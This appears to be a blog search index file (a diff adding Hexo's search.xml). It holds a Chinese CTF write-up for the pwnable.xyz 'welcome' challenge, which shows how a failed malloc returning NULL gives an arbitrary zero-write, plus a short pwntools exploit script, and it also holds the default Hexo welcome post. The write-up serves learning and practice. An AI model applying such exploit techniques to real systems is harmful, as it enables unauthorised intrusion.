@@ -1,0 +1,41 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search> 
+  
+  
+    
+    <entry>
+      <title>pwnable.xyz welcome WriteUp</title>
+      <link href="/2019/08/07/pwnable-xyz-welcome-WriteUp/"/>
+      <url>/2019/08/07/pwnable-xyz-welcome-WriteUp/</url>
+      
+        <content type="html"><![CDATA[<p>开始做pwnable.xyz上的题目了，记录下做题的思路。</p><a id="more"></a><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p><img src="http://i1.fuimg.com/696456/119eebdc5119a96f.png" alt="Markdown"></p><p>​        </p><p>​    下载后解压，试运行：</p><p><img src="http://i1.fuimg.com/696456/12e8d4e4025934aa.png" alt="Markdown"></p><p>​    拖进IDA中查看源码:  </p><p><img src="http://i1.fuimg.com/696456/186e0c53b922e2b4.png" alt="Markdown"></p><p>发现Leak给出的是v3的地址，而题目的目的是要将<code>*v3</code>的值改为<code>0</code>，这将会是一个突破口。在一开始我以为<code>malloc()</code>函数申请的两个空间是连续的，但在gdb中运行后发现并不如此。  </p><p><strong>关键点</strong></p><ol><li><p><code>malloc()</code>函数在申请空间失败时返回<code>NULL</code> ,且NULL == 0.</p></li><li><p><code>v5[size - 1]</code> == <code>*(v5 + (size-1) * sizeof(char) )</code>  </p></li></ol><p>因此当我们使得<code>malloc()</code>函数分配空间失败时，v5 == 0 ，就可以实现对<code>hex(size-1)</code>地址的赋值为0操作，即可获得flag。  </p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><pre><code>from pwn import *sh = remote(&quot;svc.pwnable.xyz&quot;,30000)sh.recvuntil(&quot;Leak:&quot;)leak = sh.recvline()#print(leak)payload = str(int(leak,16) + 1)#print(payload)sh.recvuntil(&quot;Length of your message: &quot;)sh.sendline(payload)sh.recv()sh.sendline(&quot; &quot;)print(sh.recv())</code></pre>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> pwn </tag>
+            
+            <tag> ctf </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Hello World</title>
+      <link href="/2019/08/03/hello-world/"/>
+      <url>/2019/08/03/hello-world/</url>
+      
+        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><a id="more"></a><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre><code class="bash">$ hexo new &quot;My New Post&quot;</code></pre><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre><code class="bash">$ hexo server</code></pre><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre><code class="bash">$ hexo generate</code></pre><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre><code class="bash">$ hexo deploy</code></pre><p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+  
+  
+</search>
